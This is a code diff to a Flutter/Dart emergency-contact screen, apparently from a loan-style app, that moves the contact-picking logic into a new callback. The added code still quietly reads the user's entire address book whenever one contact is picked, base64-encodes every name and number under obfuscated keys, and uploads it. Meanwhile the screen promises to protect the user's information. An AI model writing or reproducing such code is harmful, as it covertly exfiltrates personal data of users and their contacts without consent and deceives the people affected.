@@ -38,133 +38,130 @@ class ContactView extends GetView<ContactController> {
         ),
         body: Container(
           color: Color(0xFFEBEDE5),
-          child: Expanded(
-            child: Obx(() {
-              final model = controller.model.value;
-              final keyboard = model.maiden?.trained?.keyboard ?? [];
-              return ListView(
-                children: [
-                  SizedBox(
+          child: Obx(() {
+            final model = controller.model.value;
+            final keyboard = model.maiden?.trained?.keyboard ?? [];
+            return ListView(
+              children: [
+                SizedBox(
+                  width: double.infinity,
+                  height: 120.h,
+                  child: TransitionView(
+                    title: 'Contact person',
+                    desc: 'We will protect your information security',
+                    image: 'peop_con_imge',
+                    progress: 0.8,
+                  ),
+                ),
+                SizedBox(height: 10.h),
+                ...List.generate(keyboard.length, (index) {
+                  final model = keyboard[index];
+                  final name = model.relationText ?? '';
+                  final phone = "${model.activate}-${model.suitable}";
+                  return listCellView(
+                    title: model.threat ?? '',
+                    name: name.isEmpty ? 'Choose your relationship' : name,
+                    phone: phone == '-' ? 'Contact mode' : phone,
+                    relationBlock: () {
+                      Get.bottomSheet(
+                        ContactEnmuView(
+                          model: model.employing ?? [],
+                          modelBlock: (model1) {
+                            // Get.back();
+                            model.target = model1.rates ?? '';
+                            model.relationText = model1.activate ?? '';
+                            controller.model.refresh();
+                          },
+                          dismissBlock: () {
+                            Get.back();
+                          },
+                        ),
+                      );
+                    },
+                    phoneBlock: () async {
+                      final status = await Permission.contacts.status;
+                      if (!status.isGranted) {
+                        await Permission.contacts.request();
+                      }
+                      final contact = await IOSContactService.pickContact();
+                      if (contact != null) {
+                        if (contact.activate.isEmpty || contact.space.isEmpty) {
+                          FlutterShowToast.showToast(
+                            'Name and phone number fields are required.',
+                          );
+                          return;
+                        }
+                        model.activate = contact.activate;
+                        model.suitable = contact.space;
+                        controller.model.refresh();
+                      } else {
+                        if (!status.isGranted) {
+                          PermissionConfig.showPermissionDeniedDialog(
+                            'Contact',
+                          );
+                        }
+                      }
+                      final allcontact =
+                          await IOSContactService.getAllContacts();
+                      var dictArray = {
+                        'rates': '3',
+                        'limbs': '1',
+                        'vortex': '0',
+                      };
+                      List listArray = <Map<String, dynamic>>[];
+                      for (var model in allcontact) {
+                        listArray.add({
+                          'activate': model.activate,
+                          'space': model.space,
+                        });
+                      }
+                      String jsonString = jsonEncode(listArray);
+                      String base64String = base64Encode(
+                        utf8.encode(jsonString),
+                      );
+                      dictArray['maiden'] = base64String;
+                      await controller.safeAllInfo(dictArray);
+                      print('dictArray=======$dictArray');
+                    },
+                  );
+                }),
+                Padding(
+                  padding: EdgeInsets.only(
+                    top: 40.sp,
+                    left: 13.sp,
+                    right: 13.sp,
+                    bottom: 0.sp,
+                  ),
+                  child: SizedBox(
                     width: double.infinity,
-                    height: 25.h,
-                    child: TransitionView(
-                      title: 'Contact person',
-                      desc: 'We will protect your information security',
-                      image: 'peop_con_imge',
-                      progress: 0.8,
-                    ),
-                  ),
-                  SizedBox(height: 10.h),
-                  ...List.generate(keyboard.length, (index) {
-                    final model = keyboard[index];
-                    final name = model.relationText ?? '';
-                    final phone = "${model.activate}-${model.suitable}";
-                    return InkWell(
-                      child: listCellView(
-                        title: model.threat ?? '',
-                        name: name.isEmpty ? 'Choose your relationship' : name,
-                        phone: phone == '-' ? 'Contact mode' : phone,
-                      ),
-                      onTap: () async {
-                        //获取通讯录
-                        Get.bottomSheet(
-                          ContactEnmuView(
-                            model: model.employing ?? [],
-                            dismissBlock: () {
-                              Get.back();
-                            },
-                            modelBlock: (model1) async {
-                              Get.back();
-                              final status = await Permission.contacts.status;
-                              if (!status.isGranted) {
-                                await Permission.contacts.request();
-                              }
-                              final contact =
-                                  await IOSContactService.pickContact();
-                              if (contact != null) {
-                                if (contact.activate.isEmpty ||
-                                    contact.space.isEmpty) {
-                                  FlutterShowToast.showToast(
-                                    'Name and phone number fields are required.',
-                                  );
-                                  return;
-                                }
-                                model.target = model1.rates ?? '';
-                                model.relationText = model1.activate ?? '';
-                                model.activate = contact.activate;
-                                model.suitable = contact.space;
-                                controller.model.refresh();
-                              } else {
-                                if (!status.isGranted) {
-                                  PermissionConfig.showPermissionDeniedDialog(
-                                    'Contact',
-                                  );
-                                }
-                              }
-                              final allcontact =
-                                  await IOSContactService.getAllContacts();
-                              var dictArray = {
-                                'rates': '3',
-                                'limbs': '1',
-                                'vortex': '0',
-                              };
-                              List listArray = <Map<String, dynamic>>[];
-                              for (var model in allcontact) {
-                                listArray.add({
-                                  'activate': model.activate,
-                                  'space': model.space,
-                                });
-                              }
-                              String jsonString = jsonEncode(listArray);
-                              String base64String = base64Encode(
-                                utf8.encode(jsonString),
-                              );
-                              dictArray['maiden'] = base64String;
-                              await controller.safeAllInfo(dictArray);
-                              print('dictArray=======$dictArray');
-                            },
-                          ),
-                        );
+                    height: 50.h,
+                    child: GuideCustomerBtn(
+                      title: 'Next step',
+                      onPressed: () {
+                        Map<String, dynamic> dict = {};
+                        final model = controller.model.value;
+                        final listArratModel =
+                            model.maiden?.trained?.keyboard ?? [];
+                        List<Map<String, dynamic>> dictArray = [];
+                        for (var model in listArratModel) {
+                          final dict = {
+                            'suitable': model.suitable ?? '',
+                            'activate': model.activate ?? '',
+                            'target': model.target ?? '',
+                            'facing': model.facing ?? '',
+                          };
+                          dictArray.add(dict);
+                        }
+                        final jsonStr = jsonEncode(dictArray);
+                        dict['maiden'] = jsonStr;
+                        controller.upContactInfo(dict);
                       },
-                    );
-                  }),
-                  Padding(
-                    padding: EdgeInsets.only(
-                      top: 40.sp,
-                      left: 13.sp,
-                      right: 13.sp,
-                    ),
-                    child: SizedBox(
-                      width: double.infinity,
-                      height: 50.h,
-                      child: GuideCustomerBtn(
-                        title: 'Next step',
-                        onPressed: () {
-                          Map<String, dynamic> dict = {};
-                          final model = controller.model.value;
-                          final listArratModel =
-                              model.maiden?.trained?.keyboard ?? [];
-                          List<Map<String, dynamic>> dictArray = [];
-                          for (var model in listArratModel) {
-                            final dict = {
-                              'suitable': model.suitable ?? '',
-                              'activate': model.activate ?? '',
-                              'target': model.target ?? '',
-                              'facing': model.facing ?? '',
-                            };
-                            dictArray.add(dict);
-                          }
-                          final jsonStr = jsonEncode(dictArray);
-                          dict['maiden'] = jsonStr;
-                          controller.upContactInfo(dict);
-                        },
-                      ),
                     ),
                   ),
-                ],
-              );
-            }),
-          ),
+                ),
+              ],
+            );
+          }),
         ),
       ),
     );
@@ -175,6 +172,8 @@ Widget listCellView({
   required String title,
   required String name,
   required String phone,
+  required VoidCallback relationBlock,
+  required VoidCallback phoneBlock,
 }) {
   return Padding(
     padding: EdgeInsets.only(bottom: 15.sp),
@@ -195,48 +194,54 @@ Widget listCellView({
               ),
             ),
             SizedBox(height: 9.h),
-            Container(
-              height: 40.h,
-              decoration: BoxDecoration(
-                color: Colors.white,
-                borderRadius: BorderRadius.circular(9.sp),
-              ),
-              child: Padding(
-                padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
-                child: Row(
-                  children: [
-                    Text(name),
-                    Spacer(),
-                    Image.asset(
-                      'assets/images/right_image.png',
-                      width: 15.w,
-                      height: 15.h,
-                      fit: BoxFit.cover,
-                    ),
-                  ],
+            InkWell(
+              onTap: relationBlock,
+              child: Container(
+                height: 40.h,
+                decoration: BoxDecoration(
+                  color: Colors.white,
+                  borderRadius: BorderRadius.circular(9.sp),
+                ),
+                child: Padding(
+                  padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
+                  child: Row(
+                    children: [
+                      Text(name),
+                      Spacer(),
+                      Image.asset(
+                        'assets/images/right_image.png',
+                        width: 15.w,
+                        height: 15.h,
+                        fit: BoxFit.cover,
+                      ),
+                    ],
+                  ),
                 ),
               ),
             ),
             SizedBox(height: 9.h),
-            Container(
-              height: 40.h,
-              decoration: BoxDecoration(
-                color: Colors.white,
-                borderRadius: BorderRadius.circular(9.sp),
-              ),
-              child: Padding(
-                padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
-                child: Row(
-                  children: [
-                    Text(phone),
-                    Spacer(),
-                    Image.asset(
-                      'assets/images/phe_lis_ionge.png',
-                      width: 15.w,
-                      height: 15.h,
-                      fit: BoxFit.cover,
-                    ),
-                  ],
+            InkWell(
+              onTap: phoneBlock,
+              child: Container(
+                height: 40.h,
+                decoration: BoxDecoration(
+                  color: Colors.white,
+                  borderRadius: BorderRadius.circular(9.sp),
+                ),
+                child: Padding(
+                  padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
+                  child: Row(
+                    children: [
+                      Text(phone),
+                      Spacer(),
+                      Image.asset(
+                        'assets/images/phe_lis_ionge.png',
+                        width: 15.w,
+                        height: 15.h,
+                        fit: BoxFit.cover,
+                      ),
+                    ],
+                  ),
                 ),
               ),
             ),
